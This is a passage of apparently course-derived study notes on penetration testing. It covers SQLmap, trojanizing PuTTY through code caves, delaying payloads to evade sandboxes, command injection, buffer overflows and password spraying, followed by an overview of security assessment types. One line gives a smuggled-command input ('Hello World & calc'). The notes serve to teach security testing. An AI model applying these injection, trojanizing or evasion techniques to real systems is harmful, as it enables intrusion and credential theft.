&nbsp;			§ Options explained:

&nbsp;				□ --forms → looks for input forms.

&nbsp;				□ --crawl=2 → crawls the site up to depth 2.

&nbsp;				□ --threads=10 → speeds up testing.

&nbsp;				□ --dump → extracts database contents if vulnerable.

&nbsp;		○ Exploitation Results

&nbsp;			§ SQLmap findings:

&nbsp;				□ Database identified: MySQL.

&nbsp;				□ Parameter email in login form → union-injectable.

&nbsp;				□ Vulnerable to both SQL injection and cross-site scripting (XSS).

&nbsp;				□ Detected 5 columns in the SQL query.

&nbsp;			§ Actions performed:

&nbsp;				□ Executed SQL injection.

&nbsp;				□ Dumped database tables.

&nbsp;				□ Extracted password hashes.

&nbsp;				□ Cracked hashes → obtained administrative credentials.

&nbsp;		○ Why SQLmap is Important

&nbsp;			§ Automates detection and exploitation of SQL injection.

&nbsp;			§ Can fingerprint databases, test different injection techniques, dump sensitive data, and even crack credentials.

&nbsp;			§ Saves time compared to manual testing, but results still require validation.

&nbsp;			§ Demonstrates real-world risk by proving data exfiltration and credential compromise.



#### Understand Exploit Code



Exploit a Target

&nbsp;	• Focuses on the delivery and exploitation phases of the cyber kill chain — where malware or attack payloads are introduced into a target system and executed. It reviews common delivery/exploitation techniques and illustrates them with high-profile case studies like WannaCry, Stuxnet, Saudi Aramco, and Sony PlayStation.

&nbsp;	• Key Concept

&nbsp;		○ Delivery Mechanisms

&nbsp;			§ Four common methods to deliver malicious payloads:

&nbsp;				• Email attachments (infected executables, Word/PDF files with malicious macros or exploits).

&nbsp;				• Malicious websites/hyperlinks (drive-by downloads, trojanized software, phishing).

&nbsp;				• Exposed services or ports (sending exploit packets or direct malware uploads).

&nbsp;				• Removable media (USB drives with auto-run malware, often used in isolated networks).

&nbsp;		○ Exploitation Techniques

&nbsp;			§ Human exploitation: tricking users into executing malicious attachments.

&nbsp;			§ Document/application exploits: Word, PDF, Flash, or spreadsheets with embedded malicious code.

&nbsp;			§ Browser exploitation: malicious websites exploiting browser vulnerabilities to install droppers.

&nbsp;			§ Credential misuse: stolen/cracked credentials from password dumps or clear-text traffic.

&nbsp;			§ Service exploitation: using vulnerabilities in exposed services (SMB, print spooler, etc.) to gain access silently.

&nbsp;		○ WannaCry (2017)

&nbsp;			§ Delivery: Email with infected ZIP file.

&nbsp;			§ Exploitation: Zero-day SMB vulnerability EternalBlue (NSA-developed).

&nbsp;			§ Effect: Massive ransomware propagation across networks, leveraging infected machines as launchpads.

&nbsp;		○ Stuxnet (2010)

&nbsp;			§ Delivery: Initially suspected USB drives; later traced to supplier compromise and USB spread.

&nbsp;			§ Exploitation: Zero-day vulnerabilities (e.g., Microsoft Print Spooler) + Siemens PLC injection.

&nbsp;			§ Effect: Targeted Iranian uranium centrifuges, showcasing state-sponsored cyber warfare.

&nbsp;		○ Saudi Aramco (2012)

&nbsp;			§ Delivery: Malicious website clicked by an employee.

&nbsp;			§ Exploitation: Browser vulnerability dropped Shamoon malware.

&nbsp;			§ Effect: 30,000 workstations wiped, severe business disruption.

&nbsp;		○ Sony PlayStation Hack (2011)

&nbsp;			§ Delivery: External penetration via vulnerable service.

&nbsp;			§ Exploitation: SMB flaw in Red Hat Linux Apache servers.

&nbsp;			§ Effect: Breach exposed 77 million credit cards, one of the largest data breaches.

&nbsp;		○ Lessons Learned

&nbsp;			§ Delivery often relies on social engineering (phishing, malicious attachments, USBs).

&nbsp;			§ Exploitation leverages software vulnerabilities (zero-days, unpatched systems, weak credentials).

&nbsp;			§ High-profile incidents demonstrate:

&nbsp;				• Nation-state cyber warfare (Stuxnet).

&nbsp;				• Ransomware at global scale (WannaCry).

&nbsp;				• Mass disruption of industry (Saudi Aramco).



Finding Caves for Code Injection

&nbsp;	• explains how attackers can modify legitimate executables by injecting malicious code. It introduces the Portable Executable (PE) format, explores how to analyze executables, and discusses two main injection methods: adding a new section or using code caves. Tools like PE Studio and Cminer are demonstrated.

&nbsp;	• Key Concepts

&nbsp;		○ Trojan Programs

&nbsp;			§ Malware disguised as legitimate software.

&nbsp;			§ Two approaches:

&nbsp;				□ Entirely malicious software disguised as useful.

&nbsp;				□ Legitimate software altered to include malicious code.

&nbsp;		○ Portable Executable (PE) Format

&nbsp;			§ Windows executables (EXE) have a structured format called PE.

&nbsp;			§ Components:

&nbsp;				□ MS-DOS stub (first few hundred bytes, with an error message if run incorrectly).

&nbsp;				□ PE Header (locations and sizes of code/data, OS target, stack size).

&nbsp;				□ Sections (code or data segments).

&nbsp;			§ Important fields:

&nbsp;				□ Section alignment (e.g., 0x1000).

&nbsp;				□ Image base (e.g., 0x400000).

&nbsp;				□ Directories \& sections (define runtime functions, imports, exports, etc.).

&nbsp;			§ Manifest: often contains XML configuration.

&nbsp;		○ Tools for analysis:

&nbsp;			§ Hex editors (to view raw PE file structure).

&nbsp;			§ PE Studio (GUI tool to automatically parse and analyze executables).

&nbsp;		○ Code Injection Techniques

&nbsp;			§ Adding a new section: Create an entirely new area in the PE file for malicious code.

&nbsp;			§ Using code caves: Insert malicious code into unused areas (“caves”) within existing sections of the executable.

&nbsp;			§ Cminer tool:

&nbsp;				□ Scans executables to find available code caves.

&nbsp;				□ Example findings:

&nbsp;					® Notepad.exe → 6 caves, 3–511 bytes, in data sections.

&nbsp;					® Putty.exe → 6 caves, larger caves, also in data sections.

&nbsp;		○ Anti-Detection Consideration

&nbsp;			§ If malware executes immediately at startup, it risks detection by sandboxing or anti-malware tools.

&nbsp;			§ Attackers often design Trojans to trigger code execution at a later user interaction (e.g., when clicking a menu item), making detection harder.



Understand Code Injection

&nbsp;	• demonstrates how attackers (and penetration testers) can perform code injection into executables. Using PuTTY as the target, the process shows how to identify injection points, insert malicious code into unused space (code caves), and modify the program flow to execute that code stealthily. It also explains how to finalize and legitimize the modified binary so it runs without warnings.

&nbsp;	• Key Concepts

&nbsp;		○ Injection Point Identification

&nbsp;			§ The target application (PuTTY) is analyzed using the x32dbg debugger.

&nbsp;			§ The login prompt (“Login as:”) is identified as a logical point for code injection.

&nbsp;			§ The instruction at that point is replaced with a jump instruction redirecting execution to a code cave.

&nbsp;		○ Code Caves and Injection

&nbsp;			§ A code cave (section of unused null bytes) in the rdata section is chosen as the injection space.

&nbsp;			§ Example injected code: simple no-op instructions (0x90) for demonstration.

&nbsp;			§ The injection must include a return jump back to the original code location to preserve program flow.

&nbsp;		○ Debugger Workflow

&nbsp;			§ x32dbg is used to:

&nbsp;				• Search for string references (login as).

&nbsp;				• Insert a jump into the cave.

&nbsp;				• Write injected instructions.

&nbsp;				• Set breakpoints and verify execution flow.

&nbsp;			§ The program is run to confirm that execution passes into the injected code before returning to normal behavior.

&nbsp;		○ Manual Patching

&nbsp;			§ If saving changes through x32dbg fails, modifications can be applied with a hex editor.

&nbsp;			§ The binary changes are recorded (e.g., replaced hex instructions).

&nbsp;			§ A new executable is saved (in the example, renamed to mutty.exe).

&nbsp;		○ Ensuring Executable Runs

&nbsp;			§ After injection, the modified section must be marked executable.

&nbsp;			§ The PE editor in LordPE is used to:

&nbsp;				• Edit the section header (rdata) → mark as executable.

&nbsp;				• Recalculate the checksum so Windows accepts the modified binary.

&nbsp;			§ The patched file can now execute normally without triggering system errors.

&nbsp;		○ Security \& Attacker Perspective

&nbsp;			§ This technique mirrors real-world attacker methods:

&nbsp;				• Modify legitimate software to run hidden malicious payloads.

&nbsp;				• Delay execution until a trigger event (e.g., login prompt) to avoid sandbox detection.

&nbsp;			§ In penetration testing, such methods are used to demonstrate vulnerabilities and credential harvesting risks.



Understand Command Injection

&nbsp;	• The transcript explains command injection vulnerabilities, focusing on a real-world case (Rust Standard Library vulnerability CVE-2024-24576) and demonstrates how attackers can exploit improperly sanitized input to execute arbitrary system commands.

&nbsp;	• Key Concepts

&nbsp;		○ The Vulnerability

&nbsp;			§ CVE-2024-24576 (published April 2024).

&nbsp;			§ Affected the Rust Standard Library (before version 1.77.2).

&nbsp;			§ Root cause: failure to properly escape arguments when invoking batch files on Windows.

&nbsp;			§ Impact: Attackers controlling input arguments could inject and execute arbitrary shell commands.

&nbsp;			§ Other languages (like Python) using similar system calls were also affected.

&nbsp;		○ Injection Basics

&nbsp;			§ Command injection is a form of injection attack.

&nbsp;			§ Works by appending crafted extra data to normal input.

&nbsp;			§ The payload causes the target system to escape legitimate processing and execute unintended commands.

&nbsp;			§ Goal: Run additional malicious commands alongside the expected one.

&nbsp;		○ Python Demonstration

&nbsp;			§ A simple Python program:

&nbsp;				□ Reads user input.

&nbsp;				□ Passes it to a batch file (bad.bat) as an argument.

&nbsp;				□ Batch file simply echoes back the input.

&nbsp;			§ Exploit:

&nbsp;				□ Input "Hello World" → prints back correctly.

&nbsp;				□ Input "Hello World \& calc" → prints back message and launches Windows Calculator.

&nbsp;			§ This shows how unescaped input can trigger unexpected system commands.

&nbsp;		○ Lessons Learned

&nbsp;			§ Validation and sanitization of input are critical.

&nbsp;			§ Never pass raw user input directly to system-level commands or scripts.

&nbsp;			§ Use safe APIs and parameterized calls instead of concatenating command strings.

&nbsp;			§ Security patches (like Rust’s fix) reinforce the need to update environments promptly.



Understand Buffer Overflows

&nbsp;	• explains how buffer overflow vulnerabilities work by walking through a simulated program. It shows how writing more data than the allocated buffer space allows can overwrite critical values on the stack (like the return address), enabling attackers to redirect execution flow to malicious payloads.

&nbsp;	• Key Concepts

&nbsp;		○ Buffer Overflow Basics

&nbsp;			§ A buffer overflow occurs when input data exceeds the allocated buffer size.

&nbsp;			§ Extra data overwrites adjacent memory, including the return address on the stack.

&nbsp;			§ This allows attackers to redirect execution to injected payload code.

&nbsp;		○ Simulated Example (MASM Program)

&nbsp;			§ Program simulates receiving a packet with a user name.

&nbsp;			§ Uses a routine (sco) to copy this input into a fixed 32-byte buffer.

&nbsp;			§ If the input is too long, data spills over, overwriting stack memory.

&nbsp;			§ Includes three parts in the malicious packet:

&nbsp;				□ Padding (filler bytes, e.g., “A”s).

&nbsp;				□ Exploit (new return address pointing to payload).

&nbsp;				□ Payload (malicious code to run).

&nbsp;			§ Debugger Walkthrough

&nbsp;				□ Debugger (MASM/x32dbg) shows how the stack evolves step-by-step:

&nbsp;					® Normal behavior: “Hello, <name>” message.

&nbsp;					® Malicious input: overflows the 32-byte buffer, overwrites return address.

&nbsp;				□ When the subroutine ends (RET instruction), instead of returning to the normal code, execution jumps to the attacker’s payload injected in the buffer.

&nbsp;				□ Payload in the example executes a malicious message box.

&nbsp;		○ Technical Details

&nbsp;			§ Registers in use:

&nbsp;				□ EBP saves stack pointer.

&nbsp;				□ EBX points to input packet.

&nbsp;				□ EDX/ECX manage local buffer copies.

&nbsp;				□ EDI inserts the copied string into the final message.

&nbsp;			§ Stack pointer (ESP) and return address are critical points of attack.

&nbsp;			§ Overwritten return address now points to 403024 (payload start).

&nbsp;		○ Security Implications

&nbsp;			§ Many real-world services are vulnerable if they fail to validate input length.

&nbsp;			§ Classic attack structure: Padding → New Return Address → Payload.

&nbsp;			§ Buffer overflows are a major vector for remote code execution (RCE).

&nbsp;			§ Exploits often leverage known memory addresses or gadgets to reliably execute attacker code.



Password Spraying Active Directory

&nbsp;	• The transcript explains how password spraying works as an attack technique against Active Directory (AD), using tools like the PowerShell script DomainPasswordSpray. It shows how attackers attempt a small set of commonly used or guessed passwords across many accounts to find weak credentials.

&nbsp;	• Key Concepts

&nbsp;		○ Password Spraying Defined

&nbsp;			§ Unlike brute force (which targets one account with many passwords), password spraying targets many accounts with one (or a few) common passwords.

&nbsp;			§ Reduces the risk of account lockouts and is more effective in enterprise environments where users often choose weak or reused passwords.

&nbsp;		○ Tools and Execution

&nbsp;			§ Example tool: DomainPasswordSpray.ps1 (PowerShell script by dafthack).

&nbsp;			§ Can be run with:

&nbsp;				□ A single guessed password (e.g., kittykat).

&nbsp;				□ A password list (dictionary).

&nbsp;			§ Demonstrated on a domain workstation while logged in as a domain user.

&nbsp;		○ Detection of Weak Passwords

&nbsp;			§ In the example, running the script with password kittykat revealed that user achtar was using that password.

&nbsp;			§ Such results highlight weak password hygiene across enterprises.

&nbsp;		○ Enterprise Password Weakness

&nbsp;			§ Around 30% of enterprise passwords are weak.

&nbsp;			§ With the right password list, password spraying can reliably uncover vulnerable accounts.

&nbsp;			§ This makes it a high-value attack technique for penetration testers and adversaries alike.



Find Exploit Code

&nbsp;	• explains how the process of finding and using exploit code has evolved. Originally, testers had to research and write their own exploits, but today they can leverage public exploit databases, research reports, and GitHub repositories. It highlights resources, risks, and cautions when sourcing exploit code.

&nbsp;	• Key Concepts

&nbsp;		○ Historical vs. Modern Approach

&nbsp;			§ Earlier: Pen testers had to discover vulnerabilities themselves and write exploits from scratch, requiring debugging and MASM programming expertise—a process that could take weeks.

&nbsp;			§ Now: Exploits and analyses are widely available from researchers, advisory sites, and exploit databases, making it faster to find and use working exploits.

&nbsp;		○ Sources of Exploit Information

&nbsp;			§ Research sites \& advisories:

&nbsp;				□ Malware Archeology (aggregates reports).

&nbsp;				□ Malwarebytes Labs (offers free technical writeups).

&nbsp;				□ Cyber research firms (some open, some paid threat intelligence).

&nbsp;			§ Exploit databases:

&nbsp;				□ Exploit-DB (exploit-db.com) – A key source of ready-made exploit code.

&nbsp;					® Provides filters (e.g., remote exploits).

&nbsp;					® Metadata includes date, title, platform, author, and flags:

&nbsp;						◊ D: Download exploit code.

&nbsp;						◊ A: Download vulnerable application.

&nbsp;						◊ V: Code verified.

&nbsp;				□ Other sources:

&nbsp;					® Legal Hackers (includes proof-of-concept code but fewer recent updates).

&nbsp;					® GitHub repos of independent researchers.

&nbsp;		○ Example

&nbsp;			§ A remote exploit listed in Exploit-DB: Remote Desktop Web Access attack.

&nbsp;			§ Demonstrated as a Python exploit usable in Metasploit.

&nbsp;		○ Cautions

&nbsp;			§ Legitimacy concerns: Exploit code from individuals may contain malware or backdoors.

&nbsp;			§ Quality issues: Some exploits may have intentional mistakes (forcing the user to fix before use), while others contain unintentional errors.

&nbsp;			§ Always verify the source and inspect code before execution.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Security Testing Essential

#### Understanding Security Assessments



Language is Important

&nbsp;	• Language and terminology in cybersecurity assessments matter a great deal. Misusing terms (e.g., calling a vulnerability scan a penetration test) can cause serious misunderstandings, leading to false confidence, poor decisions, and potentially severe security consequences.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Clear Language

&nbsp;			§ Different security assessments (vulnerability scan vs. penetration test) are not interchangeable.

&nbsp;			§ Mislabeling creates confusion for leadership and can lead to a dangerous false sense of security.

&nbsp;		○ Consequences of Misinterpretation

&nbsp;			§ If management cannot distinguish between assessment types, they may think their systems are safer than they really are.

&nbsp;			§ This can result in:

&nbsp;				□ Production outages from issues that were overlooked.

&nbsp;				□ Data breaches requiring public disclosure, harming customers and reputation.

&nbsp;			§ Root cause often traces back to misunderstanding security terminology.

&nbsp;		○ Five Distinct Types of Security Assessments

&nbsp;			§ Risk Assessment – Identifies risks and their impact.

&nbsp;			§ Security Controls Assessment – Evaluates whether controls are in place and working.

&nbsp;			§ Compliance Assessment – Checks alignment with regulatory or industry requirements.

&nbsp;			§ Vulnerability Assessment – Identifies weaknesses in systems.

&nbsp;			§ Penetration Test – Simulates real-world attacks to exploit weaknesses.

&nbsp;		○ Choosing the Right Assessment

&nbsp;			§ Each assessment has different goals, techniques, and outcomes.

&nbsp;			§ The effectiveness of security efforts depends on matching the right type of assessment to the organization’s needs.



Risk Assessments

&nbsp;	• The purpose of a risk assessment is to identify and evaluate where an organization is most vulnerable to threats, so it can prioritize protections and strengthen its ability to achieve its mission. Understanding the distinction between threats and vulnerabilities is essential to this process.

&nbsp;	• Key Concepts

&nbsp;		○ Goal of a Risk Assessment

&nbsp;			§ Determine areas where an organization is most exposed to attack or disruption.

&nbsp;			§ Strengthen the quality of other security assessments by using risk assessment results as an input.

&nbsp;		○ Threats vs. Vulnerabilities (NIST definitions)

&nbsp;			§ Threat: A circumstance or event that can compromise the confidentiality, integrity, or availability (CIA) of information or systems.

&nbsp;				□ Examples: data breaches exposing secrets, unauthorized changes, or denial-of-service attacks.

&nbsp;			§ Vulnerability: A weakness that allows a threat to succeed.

&nbsp;				□ Examples: missing patches, default admin passwords, or physical weaknesses like a data center in a flood-prone area.

&nbsp;			§ Risk Assessment Process

&nbsp;				□ Identify relevant threats and vulnerabilities.

&nbsp;				□ Score risks based on two factors:

&nbsp;					® Likelihood: How probable is the threat exploiting the vulnerability?

&nbsp;					® Impact: How severe would the consequences be if it happened?

&nbsp;			§ Contextual Importance

&nbsp;				□ A recent, thorough risk assessment improves all other security activities (penetration tests, compliance checks, etc.).

&nbsp;				□ It guides resource prioritization so organizations focus on the most significant risks.



Calculating Risk Score

&nbsp;	• Risk scoring helps organizations prioritize cybersecurity risks by evaluating both the likelihood of a threat exploiting a vulnerability and the impact if it succeeds. The result guides leadership on where to focus mitigation efforts.

&nbsp;	• Key Concepts

&nbsp;		○ Likelihood (Probability of Exploitation)

&nbsp;			§ Defined as the probability that a threat will exploit a vulnerability.

&nbsp;			§ Example factors for malware on a laptop:

&nbsp;				□ Presence of endpoint protection.

&nbsp;				□ Internet usage habits.

&nbsp;				□ Tendency to open email attachments from unknown senders.

&nbsp;			§ NIST uses a low, medium, high scale for likelihood.

&nbsp;		○ Impact (Consequence of Exploitation)

&nbsp;			§ Measures the severity of harm if the threat succeeds.

&nbsp;			§ Example:

&nbsp;				□ Laptop malware infection → bad day for one user.

&nbsp;				□ Server network malware outbreak → costly, widespread organizational disruption.

&nbsp;			§ NIST also uses a low, medium, high scale for impact.

&nbsp;		○ Risk Score Formula

&nbsp;			§ Risk = Likelihood × Impact

&nbsp;			§ Produces a quantifiable score to compare risks and prioritize them.

&nbsp;		○ Goal of Risk Assessment

&nbsp;			§ Not to achieve perfection, but to prioritize risks so they can be reduced to an acceptable level.

&nbsp;			§ Aligns with leadership’s risk appetite.

&nbsp;		○ Data Sources for Risk Assessment

&nbsp;			§ External Reports:

&nbsp;				□ Verizon Data Breach Investigations Report.

&nbsp;				□ Privacy Rights Clearinghouse database of breaches.

&nbsp;				□ Industry-specific ISACs (Information Sharing and Analysis Centers).

&nbsp;			§ Internal Data:

&nbsp;				□ IT Service Management (ITSM) system.

&nbsp;				□ Help desk ticket history for past incidents.

&nbsp;		○ Outcome

&nbsp;			§ A report containing a prioritized list of cybersecurity risks that leadership should monitor and address.



Security Control Assessments

&nbsp;	• A security controls assessment evaluates which security controls are currently in place within an organization, using recognized security control frameworks as a baseline. The assessment highlights gaps and provides a prioritized view of where security improvements are needed.

&nbsp;	• Key Concepts

&nbsp;		○ Goal of a Security Controls Assessment

&nbsp;			§ Identify and document the security controls already implemented.

&nbsp;			§ Compare against a chosen framework to ensure coverage.

&nbsp;		○ Role of Frameworks

&nbsp;			§ Frameworks provide structured categories and sets of recommended controls (designed by governing bodies or standards organizations).

&nbsp;			§ Using a framework ensures consistency and alignment with best practices.

&nbsp;		○ Assessment Methodology

&nbsp;			§ Select a security control framework (e.g., NIST, ISO, CIS).

&nbsp;			§ Document whether each control exists in the organization.

&nbsp;			§ Optionally assign a quantitative score to reflect the perceived effectiveness of each control.

&nbsp;		○ How Assessments Are Conducted

&nbsp;			§ Typically based on:

&nbsp;				□ Interviews with technical staff.

&nbsp;				□ Analysis of reports, system configurations, and application settings.

&nbsp;			§ Results are not always exact measurements, but a mix of documented evidence and expert judgment.

&nbsp;		○ Outcome

&nbsp;			§ A prioritized list of security control gaps.

&nbsp;			§ Provides clarity on where the organization meets or falls short of framework expectations.

&nbsp;		○ Framework Overlap

&nbsp;			§ There are many frameworks, but most cover similar fundamental controls.

&nbsp;			§ Experienced practitioners recognize that frameworks are often just different ways of saying the same thing.

&nbsp;			§ The instructor highlights two major frameworks as most useful and practical (to be discussed next).



NIST and ISO

&nbsp;	• Both ISO (International Organization for Standardization) and NIST (National Institute of Standards and Technology) provide widely used security frameworks. ISO offers structured, organizational guidance for building an information security program, while NIST provides deep technical detail on security controls. Together, they complement each other for a robust security program.

&nbsp;	• Key Concepts

&nbsp;		○ ISO and IEC Collaboration

&nbsp;			§ ISO partnered with IEC to create international standards across industries.

&nbsp;			§ The ISO 27000 family (63+ standards) focuses on information security management.

&nbsp;		○ ISO Standards for Security

&nbsp;			§ ISO 27001 – the most recognized, provides the overall framework for Information Security Management Systems (ISMS).

&nbsp;			§ ISO 27002 – practical guidance, containing 114 specific controls across 14 domains, grouped into four themes:

&nbsp;				□ Organizational

&nbsp;				□ Physical

&nbsp;				□ People

&nbsp;				□ Technological

&nbsp;			§ Example: Information Security Policies is a domain with clear requirements for policy documentation.

&nbsp;		○ NIST Publications

&nbsp;			§ NIST publishes hundreds of guides on cybersecurity and IT.

&nbsp;			§ NIST Cybersecurity Framework (CSF):

&nbsp;				□ Five core categories: Identify, Protect, Detect, Respond, Recover.

&nbsp;				□ Helps organizations assess and manage risk within a governance context.

&nbsp;			§ NIST SP 800-53:

&nbsp;				□ Contains 1,000+ detailed controls in 18 control families (includes privacy).

&nbsp;				□ Categorizes controls by impact level: low, moderate, high.

&nbsp;				□ Originally written to support FISMA (Federal Information Security Management Act).

&nbsp;			§ Complementary Use

&nbsp;				□ ISO 27002 → guides how to organize a security program (strategic, governance-focused).

&nbsp;				□ NIST SP 800-53 → provides technical depth on implementing and managing security controls.

&nbsp;				□ Combining both gives organizations a comprehensive security posture.



Compliance Assessments

&nbsp;	• A compliance assessment evaluates whether an organization’s security program meets the requirements of an external authority (such as PCI DSS, HIPAA, or GLBA). Unlike other assessments that are voluntary and proactive, compliance assessments are mandatory, and failure to comply can have serious financial and operational consequences.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of a Compliance Assessment

&nbsp;			§ To ensure that an organization is meeting specific external requirements (legal, regulatory, or industry standards).

&nbsp;			§ Example: PCI DSS (Payment Card Industry Data Security Standard) applies to any organization that stores, processes, or transmits credit card data.

&nbsp;		○ Comparison to Security Controls Assessment

&nbsp;			§ Content looks very similar (controls, evidence, interviews, technology checks).

&nbsp;			§ Two key differences:

&nbsp;				□ Scope: Compliance frameworks are narrow and focused on specific types of data or risks (e.g., credit card data in PCI).

&nbsp;				□ Motivation: Other assessments are done voluntarily to improve security; compliance assessments are done because organizations are required to.

&nbsp;		○ Limitations of Compliance Standards

&nbsp;			§ Example: Building a security program only on PCI DSS would leave major gaps.

&nbsp;			§ Compliance does not equal full security; it only ensures minimum required protections.

&nbsp;		○ Methods of Evidence Collection

&nbsp;			§ Staff interviews.

&nbsp;			§ Reports and outputs from control technologies.

&nbsp;		○ Consequences of Non-Compliance

&nbsp;			§ Higher per-transaction fees charged by banks.

&nbsp;			§ In cases of willful negligence, banks may revoke the right to process credit card payments entirely.

&nbsp;			§ Strong financial and operational incentives drive compliance.

&nbsp;		○ Other Industries with Compliance Requirements

&nbsp;			§ Healthcare → HIPAA.

&nbsp;			§ Energy → NERC.

&nbsp;			§ Financial services → GLBA.

&nbsp;		○ Outcome of a Compliance Assessment

&nbsp;			§ Proof of compliance (attestation).

&nbsp;			§ Provides temporary assurance to auditors and regulators until the next review cycle.



Vulnerability Assessments

&nbsp;	• A vulnerability assessment is designed to ensure that technical weaknesses in systems, applications, and devices are regularly identified, evaluated, and remediated. It focuses on finding exploitable vulnerabilities that attackers could use and prioritizing them based on severity.

&nbsp;	• Key Concepts

&nbsp;		○ Goal of a Vulnerability Assessment

&nbsp;			§ Validate that vulnerabilities are identified and remediated on a recurring basis.

&nbsp;			§ Ensure organizations stay ahead of attackers by addressing weaknesses proactively.

&nbsp;		○ Exploitable Vulnerabilities

&nbsp;			§ Key focus is on vulnerabilities that an attacker could realistically exploit.

&nbsp;			§ Examples:

&nbsp;				□ Low risk: Missing patch that only allows directory listing.

&nbsp;				□ High/critical risk: SQL injection that exposes usernames and passwords.

&nbsp;		○ Scope of Assessment

&nbsp;			§ Should be broad and inclusive:

&nbsp;				□ Servers.

&nbsp;				□ Workstations.

&nbsp;				□ Mobile devices.

&nbsp;				□ Applications and databases.

&nbsp;			§ If it has an IP address, it should be scanned.

&nbsp;		○ Tools and Methods

&nbsp;			§ Typically conducted with automated scanning tools on a regular schedule.

&nbsp;			§ Best practices for scans:

&nbsp;				□ Authenticated scans of host systems.

&nbsp;				□ Unauthenticated scans of internet-facing applications.

&nbsp;				□ Authenticated scans of non-production app instances.

&nbsp;				□ Configuration scans of systems and applications.

&nbsp;			§ NIST provides additional manual assessment techniques to complement automation.

&nbsp;		○ Outcome

&nbsp;			§ A prioritized list of vulnerabilities based on severity and exploitability.

&nbsp;			§ Includes recommendations for remediation.



Penetration Tests

&nbsp;	• A penetration test is the most advanced form of security assessment, where testers go beyond identifying weaknesses and attempt to actively exploit them. It validates how vulnerabilities could be leveraged by attackers and provides realistic insight into an organization’s true security posture.

&nbsp;	• Key Concepts

&nbsp;		○ Penetration Test as the Pinnacle

&nbsp;			§ Unlike other assessments that stop at identifying weaknesses, a penetration test attempts to exploit them.

&nbsp;			§ Builds on the results of risk, vulnerability, compliance, and controls assessments.

&nbsp;		○ Scoping a Pentest

&nbsp;			§ Insights from prior assessments (e.g., vulnerability scans, network diagrams, firewall rules) help determine:

&nbsp;				□ Which systems and processes to test.

&nbsp;				□ Which attack methods to attempt.

&nbsp;			§ Scope and depth often depend on client preferences.

&nbsp;		○ Types of Penetration Tests

&nbsp;			§ White Box Testing

&nbsp;				□ Pentester receives extensive internal information (reports, configs, even source code).

&nbsp;				□ Focuses effort on testing the most relevant and high-risk areas.

&nbsp;			§ Black Box Testing

&nbsp;				□ Pentester starts with no internal knowledge, simulating an outside attacker.

&nbsp;				□ Most realistic but risks missing weaknesses due to limited visibility.

&nbsp;			§ Gray Box Testing

&nbsp;				□ Middle ground—tester gets partial internal knowledge.

&nbsp;				□ Balances realism with efficiency by narrowing focus while still simulating an outsider’s perspective.

&nbsp;				□ Most commonly used in practice.

&nbsp;		○ Pre-Engagement Phase

&nbsp;			§ The amount of knowledge shared with testers is negotiated before the assessment.

&nbsp;			§ Determines whether the test leans more toward white box, black box, or gray box.



Goals of a Pen Test

&nbsp;	• The goals of a penetration test should be clearly defined and tailored to the organization’s priorities within the CIA triad (Confidentiality, Integrity, Availability). The chosen objectives guide the scope of testing and ensure meaningful, ethical outcomes.

&nbsp;	• Key Concepts

&nbsp;		○ Common Pen Test Goals

&nbsp;			§ Many penetration tests aim to steal privileged credentials.

&nbsp;			§ Other possible goals include:

&nbsp;				□ Gaining access to the CFO’s inbox.

&nbsp;				□ Exfiltrating intellectual property.

&nbsp;				□ Extracting customer data.

&nbsp;		○ CIA Triad Influence

&nbsp;			§ The organization’s priorities around Confidentiality, Integrity, and Availability should shape the pen test goals.

&nbsp;			§ Confidentiality-focused goals → Stealing sensitive data (customer records, IP).

&nbsp;			§ Integrity-focused goals → Demonstrating unauthorized changes to systems or data.

&nbsp;			§ Availability-focused goals → Should be avoided, since disrupting production systems during a pen test causes real damage.

&nbsp;		○ Ethical and Professional Considerations

&nbsp;			§ Sensitive data compromised during a pen test must remain secret under non-disclosure agreements or professional codes of ethics.

&nbsp;			§ Exploiting integrity flaws carries risks of cleanup and potential production incidents.

&nbsp;			§ Exploiting availability vulnerabilities is unethical and equivalent to causing real harm.

&nbsp;		○ Defining Scope Based on Business Priorities

&nbsp;			§ The scope of the penetration test should align with what matters most to the organization.

&nbsp;			§ Proper scoping ensures tests are relevant, valuable, and safe.



The Security Assessment Lifecycle

&nbsp;	• The security assessment lifecycle integrates all five assessment types (risk, security controls, compliance, vulnerability, penetration) into a continuous, cyclical process. Each assessment feeds into the next, creating efficiencies and stronger results, while ensuring organizations continuously identify, prioritize, and mitigate risks.

&nbsp;	• Key Concepts

&nbsp;		○ Integration of Assessments

&nbsp;			§ Conducting all five assessments provides comprehensive visibility into exposures.

&nbsp;			§ They build on one another to improve efficiency and quality.



&nbsp;		○ Order of Assessments (Lifecycle Flow)

&nbsp;			§ Risk Assessment → Identify risks, likelihood, impact, and leadership’s risk appetite.

&nbsp;			§ Security Controls Assessment → Take stock of existing controls; evaluate their strength, cost, and complexity in relation to identified risks.

&nbsp;			§ Compliance Assessment → Use security controls assessment output to demonstrate alignment with external requirements (e.g., PCI DSS, HIPAA).

&nbsp;			§ Vulnerability Assessment → Use automated/manual tools to identify exploitable weaknesses across hosts, applications, and devices.

&nbsp;			§ Penetration Test → Attempt to exploit weaknesses, validate resilience, and simulate real-world attacks.

&nbsp;		○ Cyclical Process

&nbsp;			§ Findings from penetration testing feed into the next risk assessment, restarting the cycle.

&nbsp;			§ Security is continuous—“not a destination, but a journey.”

&nbsp;		○ Benefits of Lifecycle Approach

&nbsp;			§ Identifies likely threats and exposures.

&nbsp;			§ Ensures security controls are appropriate and effective.

&nbsp;			§ Demonstrates compliance to regulators and industry bodies.

&nbsp;			§ Tests organizational resilience against real attacks.

&nbsp;			§ Shifts focus from incident response to business as usual, by staying ahead of attackers.

#### Your Testing Environment



The Security Tester's Toolkit

&nbsp;	• Before starting any security assessment, a tester should prepare a well-organized toolkit (“Mise en Place”). Having the right tools ready, knowing how to use them, and understanding their output is essential for effective, efficient, and professional security testing.

&nbsp;	• Key Concepts

&nbsp;		○ Mise en Place for Security Testing

&nbsp;			§ Borrowed from cooking: “everything in its place.”

&nbsp;			§ Applied to security → prepare your toolkit before testing begins.

&nbsp;			§ Avoids wasting time or missing important steps during assessments.

&nbsp;		○ Toolkit Preparation

&nbsp;			§ Assemble tools before running scans or testing systems.

&nbsp;			§ Know:

&nbsp;				□ Where to find each tool.

&nbsp;				□ How to run it (commands, configurations).

&nbsp;				□ How to interpret its results.

&nbsp;		○ Role in Assessments

&nbsp;			§ Tool choice depends on pre-assessment or pre-engagement planning.

&nbsp;			§ Different assessments may require different tools, depending on scope, goals, and systems in play.

&nbsp;		○ Learning by Doing

